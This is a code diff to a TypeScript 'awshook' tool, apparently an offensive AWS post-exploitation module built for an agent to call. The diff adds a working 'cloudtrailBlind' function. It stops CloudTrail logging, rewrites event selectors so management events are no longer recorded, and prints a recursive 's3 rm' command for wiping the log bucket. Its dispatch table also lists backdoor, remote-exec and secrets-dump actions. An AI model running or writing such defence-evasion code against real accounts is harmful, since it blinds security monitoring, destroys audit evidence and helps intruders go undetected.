@@ -383,6 +383,60 @@ async function metadataHarvest(args: string[]): Promise<HookResult> {
   return { output: output.join("\n"), findings: [] }
 }
 
+async function cloudtrailBlind(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action")
+  if (!action) return { output: "ERROR: --action required (stop|delete_logs|modify_selectors|status)", findings: [] }
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const trailName = argVal(args, "--trail-name")
+
+  if (action === "status") {
+    const r = await aws(["cloudtrail", "describe-trails"], profile, region, timeout)
+    if (r.exitCode !== 0) return { output: `[-] Cannot describe trails: ${r.stderr.trim()}`, findings: [] }
+    const trails = tryJson(r.stdout)?.trailList || []
+    const output = [`[*] CloudTrail status — ${trails.length} trail(s)\n`]
+    for (const t of trails) {
+      const status = await aws(["cloudtrail", "get-trail-status", "--name", t.Name], profile, region, timeout)
+      const s = tryJson(status.stdout)
+      output.push(`[+] ${t.Name}: logging=${s?.IsLogging}, multi-region=${t.IsMultiRegionTrail}`)
+    }
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  if (action === "stop") {
+    const name = trailName || (await (async () => {
+      const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
+      return tryJson(r.stdout)
+    })())
+    if (!name) return { output: "[-] No trail found", findings: [] }
+    const r = await aws(["cloudtrail", "stop-logging", "--name", name], profile, region, timeout)
+    return r.exitCode === 0
+      ? { output: `[+] Stopped logging on trail: ${name}`, findings: [] }
+      : { output: `[-] Failed to stop: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  if (action === "modify_selectors") {
+    const name = trailName || (await (async () => {
+      const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
+      return tryJson(r.stdout)
+    })())
+    if (!name) return { output: "[-] No trail found", findings: [] }
+    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", name, "--event-selectors", '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]'], profile, region, timeout)
+    return r.exitCode === 0
+      ? { output: `[+] Event selectors modified on ${name} — management events excluded`, findings: [] }
+      : { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  if (action === "delete_logs") {
+    const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].S3BucketName"], profile, region, timeout)
+    const bucket = tryJson(r.stdout)
+    if (!bucket) return { output: "[-] Cannot find CloudTrail S3 bucket", findings: [] }
+    return { output: `[*] CloudTrail logs in: s3://${bucket}\n[+] Use: aws s3 rm s3://${bucket}/AWSLogs/ --recursive`, findings: [] }
+  }
+
+  return { output: `ERROR: Unknown action: ${action}`, findings: [] }
+}
+
 async function stub(name: string): Promise<HookResult> {
   return { output: `[*] ${name}: not yet implemented in native TS`, findings: [] }
 }
@@ -422,7 +476,7 @@ export const AwshookTool = Tool.define("awshook", {
       lambda_backdoor: () => lambdaBackdoor(params.args, params.timeout_seconds),
       ssm_exec: () => ssmExec(params.args, params.timeout_seconds),
       metadata_harvest: () => metadataHarvest(params.args),
-      cloudtrail_blind: () => stub("cloudtrail_blind"),
+      cloudtrail_blind: () => cloudtrailBlind(params.args, params.timeout_seconds),
       secrets_dump: () => stub("secrets_dump"),
       ec2_snapshot: () => stub("ec2_snapshot"),
       cleanup_aws: () => stub("cleanup_aws"),
